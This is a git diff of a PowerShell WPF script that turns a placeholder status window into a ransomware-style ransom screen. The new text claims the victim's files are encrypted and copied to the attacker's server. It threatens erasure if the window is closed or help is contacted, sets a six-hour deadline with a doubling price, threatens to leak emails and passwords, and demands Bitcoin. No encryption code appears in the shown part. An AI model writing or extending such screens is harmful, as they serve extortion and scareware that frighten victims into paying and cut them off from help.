@@ -33,13 +33,76 @@ $b.VerticalAlignment = [System.Windows.VerticalAlignment]::Top
 
 
 $t = New-Object System.Windows.Controls.TextBlock
-$t.Text = "test`n`nComputer Name: $env:COMPUTERNAME`nUser: $env:USERNAME`nStatus: COMPLETE"
 $t.Foreground = [System.Windows.Media.Brushes]::White
 $t.FontFamily = 'Courier New'
 $t.FontSize = 12
-$t.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Center
-$t.VerticalAlignment = [System.Windows.VerticalAlignment]::Center
+$t.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Left
+$t.VerticalAlignment = [System.Windows.VerticalAlignment]::Top
 $t.TextWrapping = [System.Windows.TextWrapping]::Wrap
+$t.Margin = '20,70,20,20'
+
+# Create formatted text with Inlines
+$t.Inlines.Clear()
+
+# What happened to my computer? (Bold, Larger)
+$run1 = New-Object System.Windows.Documents.Run
+$run1.Text = "What happened to my computer?"
+$run1.FontWeight = [System.Windows.FontWeights]::Bold
+$run1.FontSize = 14
+$run1.Foreground = [System.Windows.Media.Brushes]::Yellow
+$t.Inlines.Add($run1)
+$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
+$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
+
+# Your important files have been encrypted
+$run2 = New-Object System.Windows.Documents.Run
+$run2.Text = "Your important files have been encrypted"
+$run2.FontWeight = [System.Windows.FontWeights]::Bold
+$run2.FontSize = 12
+$t.Inlines.Add($run2)
+$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
+$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
+
+# Body paragraph 1
+$run3 = New-Object System.Windows.Documents.Run
+$run3.Text = "Many of your documents, pictures, and important files are no longer accessible since they have been encrypted. Do not waste your time trying to get them back, nobody can recover them without our decryption service. Please be aware that this program will automatically erase all of your files if you attempt to get rid of this window, restart your computer, or contact help."
+$t.Inlines.Add($run3)
+$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
+$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
+$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
+
+# Can I recover my files? (Bold, Larger)
+$run4 = New-Object System.Windows.Documents.Run
+$run4.Text = "Can I recover my files?"
+$run4.FontWeight = [System.Windows.FontWeights]::Bold
+$run4.FontSize = 14
+$run4.Foreground = [System.Windows.Media.Brushes]::Yellow
+$t.Inlines.Add($run4)
+$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
+$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
+
+# Body paragraph 2
+$run5 = New-Object System.Windows.Documents.Run
+$run5.Text = "We guarantee that you can recover all of your files safely and easily, however, a payment must be made in order to regain access. You have 6 hours to submit payment. Wait any longer and the price doubles. Please be aware that we have copied all your files onto our server, and will distribute them online if you choose not to pay. This includes your saved emails / passwords."
+$t.Inlines.Add($run5)
+$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
+$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
+$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
+
+# How To Pay? (Bold, Larger)
+$run6 = New-Object System.Windows.Documents.Run
+$run6.Text = "How To Pay?"
+$run6.FontWeight = [System.Windows.FontWeights]::Bold
+$run6.FontSize = 14
+$run6.Foreground = [System.Windows.Media.Brushes]::Yellow
+$t.Inlines.Add($run6)
+$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
+$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
+
+# Body paragraph 3
+$run7 = New-Object System.Windows.Documents.Run
+$run7.Text = "Payment is accepted in BITCOIN only. For more information, click <How to buy bitcoin>. Once acquired, ensure you send the right amount to the correct address indicated in this window. A single wrong character will result in permanent loss of funds."
+$t.Inlines.Add($run7)
 
 $null = $g.Children.Add($t)
 $null = $g.Children.Add($b)
